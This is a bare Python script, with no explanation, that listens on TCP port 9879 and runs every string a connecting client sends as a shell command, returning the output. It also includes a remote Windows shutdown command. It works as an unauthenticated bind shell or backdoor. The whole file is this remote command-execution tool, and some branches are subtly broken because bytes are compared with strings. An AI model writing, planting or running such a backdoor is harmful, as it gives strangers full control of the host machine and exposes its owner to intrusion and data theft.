import socket
import os
import sys
import subprocess
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip=''
s.bind((socket.gethostname(),9879))
s.listen(4)
socketclient,addr=s.accept()
print("Got connection from",addr)
con=True
while con:
    msg = socketclient.recv(1024)
    if msg[:2].decode("utf-8") == 'cd':
        os.chdir(msg[3:].decode("utf-8"))
    print("Client=>",msg)      
    if msg=='shutdown':
        os.system("shutdown /s /t 1")
    elif msg=='quit':
        sys.exit()
    else:
        msg = subprocess.Popen(msg[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = msg.stdout.read() + msg.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        socketclient.send(str.encode(output_str + currentWD))
        print(output_str)
        

